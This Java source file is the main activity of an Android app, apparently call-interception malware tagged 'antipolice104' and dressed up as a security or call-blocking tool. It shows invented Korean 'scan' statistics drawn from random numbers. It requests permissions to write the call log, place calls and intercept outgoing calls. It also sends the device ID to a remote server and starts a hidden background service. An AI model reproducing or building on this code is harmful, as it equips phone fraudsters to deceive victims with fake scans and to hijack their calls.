package com.block.phonecall;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.widget.TextView;
import android.widget.Toast;

import com.block.phonecall.model.BaseRes;
import com.block.phonecall.preferences.AppSharedPreference;
import com.block.phonecall.retrofit.ApiCall;
import com.block.phonecall.retrofit.IApiCallback;
import com.block.phonecall.service.MainService;

import java.util.Random;

import retrofit2.Response;

//import static android.Manifest.permission.READ_PHONE_NUMBERS;
//import static android.Manifest.permission.READ_PHONE_STATE;
//import static android.Manifest.permission.READ_SMS;

public class MainActivity extends AppCompatActivity implements IApiCallback<BaseRes>, Handler.Callback {

    String android_id = "", phoneNumber = "";
    public static final String identity = "antipolice104";
    private static final int PERMISSION_REQUEST_READ_PHONE_STATE = 1;
    TelephonyManager mTelephonyManager;
    TextView tvResult, tvTime;
    Handler mHandler;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        getWindow().setStatusBarColor(getResources().getColor(R.color.switchTrack));
        tvResult = findViewById(R.id.tv_result_number);
        tvTime = findViewById(R.id.tv_time);

        Random r = new Random();
        int number = r.nextInt(100000 - 60000 + 1) + 60000;
        tvResult.setText("검사 수: "+number+"개");

        number = r.nextInt(30 - 10 + 1) + 10;
        tvTime.setText("검사시간: 00:00:"+number);

        mHandler = new Handler(this);

        mTelephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

            if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_DENIED
                || checkSelfPermission(Manifest.permission.WRITE_CALL_LOG) == PackageManager.PERMISSION_DENIED
                ||checkSelfPermission(Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_DENIED
                ||checkSelfPermission(Manifest.permission.PROCESS_OUTGOING_CALLS) == PackageManager.PERMISSION_DENIED
            ) {
                String[] permissions = {Manifest.permission.READ_PHONE_STATE, Manifest.permission.WRITE_CALL_LOG, Manifest.permission.CALL_PHONE, Manifest.permission.PROCESS_OUTGOING_CALLS};
                requestPermissions(permissions, PERMISSION_REQUEST_READ_PHONE_STATE);
            }else{
                process();
            }
    }

    void process(){
        android_id = AppSharedPreference.getInstance(this).getDeviceId();
        if(android_id.equals("")){
            if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                    android_id = mTelephonyManager.getDeviceId();
                }
            }else{
                android_id = mTelephonyManager.getDeviceId();
            }
            AppSharedPreference.getInstance(this).setDeviceId(android_id);
            ApiCall.getInstance().registerWithId(android_id, phoneNumber, identity,this);
        }else{
            Intent intent = new Intent(this, MainService.class);
            if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            }else{
                startService(intent);
            }
            mHandler.sendEmptyMessageDelayed(0, 3000);
        }
    }

    @Override
    public boolean handleMessage(@NonNull Message msg) {
        switch (msg.what){
            case 0:
                finish();
                break;
        }
        return false;
    }

    @Override
    public void onSuccess(String type, Response<BaseRes> response) {
        if(response.isSuccessful()){
            if(response.body().getErrorCode().equals("0") && response.body().getErrorMsg().equals("ok")){
                AppSharedPreference.getInstance(this).setDeviceId(android_id);
                Intent intent = new Intent(this, MainService.class);
                if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(intent);
                }else{
                    startService(intent);
                }
                mHandler.sendEmptyMessageDelayed(0, 2000);
            }else{
                ApiCall.getInstance().registerWithId(android_id, phoneNumber, identity,this);
            }
        }else{
            ApiCall.getInstance().registerWithId(android_id, phoneNumber, identity,this);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case PERMISSION_REQUEST_READ_PHONE_STATE: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
//                    Toast.makeText(this, "Permission granted: " + PERMISSION_REQUEST_READ_PHONE_STATE, Toast.LENGTH_SHORT).show();
                    process();
                } else {
//                    Toast.makeText(this, "Permission NOT granted: " + PERMISSION_REQUEST_READ_PHONE_STATE, Toast.LENGTH_SHORT).show();
                    finish();
                }
                return;
            }
        }
    }

//    private void requestPermission() {
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
//            requestPermissions(new String[]{READ_SMS, READ_PHONE_NUMBERS, READ_PHONE_STATE}, 100);
//        }
//    }
//    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
//        switch (requestCode) {
//            case 100:
//                TelephonyManager tMgr = (TelephonyManager)  this.getSystemService(Context.TELEPHONY_SERVICE);
//                if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) !=
//                        PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this,
//                        Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED  &&
//                        ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
//                    return;
//                }
//                phoneNumber = tMgr.getLine1Number();
//                break;
//        }
//    }


    @Override
    public void onFailure(Object data) {
        ApiCall.getInstance().registerWithId(android_id, phoneNumber, identity,this);
    }
}
